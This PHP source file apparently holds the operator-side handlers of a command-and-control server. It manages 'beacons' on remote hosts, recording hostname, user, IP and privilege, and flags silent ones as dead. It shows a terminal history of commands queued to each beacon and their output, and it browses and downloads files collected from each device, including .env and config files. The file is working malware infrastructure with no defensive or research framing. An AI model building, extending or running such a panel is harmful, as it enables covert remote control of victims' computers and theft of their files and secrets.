<?php
declare(strict_types=1);

function handleRename(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    $nick = trim($input['nickname'] ?? '');
    if (empty($uuid)) jsonError('Missing uuid');
    $db = DB::connect();
    $db->update('beacons', 'uuid', $uuid, ['nickname' => $nick]);
    jsonOut(['status' => 'ok']);
}

function handleSaveNotes(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    $text = $input['text'] ?? '';
    if (empty($uuid)) jsonError('Missing uuid');
    DB::connect()->update('beacons', 'uuid', $uuid, ['notes' => $text]);
    jsonOut(['status' => 'ok']);
}

function handleListBeacons(): void {
    $db = DB::connect();
    $beacons = $db->all('beacons');
    $n = now();
    foreach ($beacons as &$b) {
        if (($b['status'] ?? '') === 'active' && !empty($b['last_seen'])) {
            $gap = strtotime($n) - strtotime($b['last_seen']);
            if ($gap > 120) $b['status'] = 'dead';
        }
    }
    unset($b);
    usort($beacons, fn($a, $b) => strcmp($b['last_seen'] ?? '', $a['last_seen'] ?? ''));
    jsonOut($beacons);
}

function handleLsDevice(): void {
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $dir = deviceDir($uuid);
    $entries = [];
    if (is_dir($dir)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($it as $file) {
            $rel = str_replace($dir . '/', '', $file->getPathname());
            $rel = str_replace('\\', '/', $rel);
            $entries[] = [
                'name' => $file->getFilename(),
                'path' => $rel,
                'type' => $file->isDir() ? 'dir' : 'file',
                'size' => $file->isFile() ? $file->getSize() : 0,
                'modified' => date('Y-m-d H:i:s', $file->getMTime()),
            ];
        }
    }
    usort($entries, fn($a, $b) => strcmp($a['path'], $b['path']));
    jsonOut(['entries' => $entries]);
}

function handleDeviceRead(): void {
    $uuid = $_GET['beacon_uuid'] ?? '';
    $path = $_GET['path'] ?? '';
    if (empty($uuid) || empty($path)) jsonError('Missing parameters');
    $dir = deviceDir($uuid);
    $full = $dir . '/' . preg_replace('/[^a-zA-Z0-9\/\.\-_]/', '', $path);
    if (!str_starts_with(realpath($full) ?: '', realpath($dir) ?: '')) jsonError('Access denied');
    if (!is_file($full)) jsonError('File not found', 404);
    $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
    $textExts = ['txt','md','json','xml','yml','yaml','ini','cfg','conf','log','sh','py','js','html','php','css','rb','pl','go','rs','toml','env','sql','csv','c','h','cpp','bat','ps1'];
    if (in_array($ext, $textExts)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($full);
    } else {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($full) . '"');
        readfile($full);
    }
    exit;
}

function handleDeviceInfo(): void {
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $db = DB::connect();
    $b = $db->findOne('beacons', 'uuid', $uuid);
    if (!$b) jsonError('Not found', 404);
    jsonOut([
        'hostname' => $b['hostname'] ?? '',
        'os' => $b['os'] ?? '',
        'username' => $b['username'] ?? '',
        'ip' => $b['ip'] ?? '',
        'privilege' => $b['privilege'] ?? 'user',
        'pid' => $b['pid'] ?? 0,
        'collected_at' => $b['last_seen'] ?? '',
    ]);
}

function handleTerminal(): void {
    $uuid = $_GET['beacon_uuid'] ?? '';
    if (empty($uuid)) jsonError('Missing beacon_uuid');
    $db = DB::connect();
    $tasks = $db->findAll('tasks', ['beacon_uuid' => $uuid]);
    $results = $db->findAll('results', ['beacon_uuid' => $uuid]);
    $resultMap = [];
    foreach ($results as $r) $resultMap[$r['task_id']] = $r;
    $history = [];
    usort($tasks, fn($a, $b) => strcmp($a['created_at'] ?? '', $b['created_at'] ?? ''));
    foreach ($tasks as $t) {
        $out = '';
        if (isset($resultMap[$t['id']])) $out = $resultMap[$t['id']]['output'] ?? '';
        $history[] = ['command' => $t['command'], 'output' => $out];
    }
    jsonOut($history);
}

function handleRemoveDevice(): void {
    requireMethod('POST');
    $input = jsonInput();
    $uuid = trim($input['uuid'] ?? '');
    if (empty($uuid)) jsonError('Missing uuid');
    $db = DB::connect();
    $db->delete('beacons', 'uuid', $uuid);
    $db->delete('tasks', 'beacon_uuid', $uuid);
    $db->delete('results', 'beacon_uuid', $uuid);
    $db->delete('files', 'beacon_uuid', $uuid);
    $db->delete('media', 'beacon_uuid', $uuid);
    $db->delete('browse_cache', 'beacon_uuid', $uuid);
    $dir = deviceDir($uuid);
    if (is_dir($dir)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($it as $f) {
            if ($f->isDir()) rmdir($f->getPathname());
            else unlink($f->getPathname());
        }
        rmdir($dir);
    }
    jsonOut(['status' => 'ok']);
}
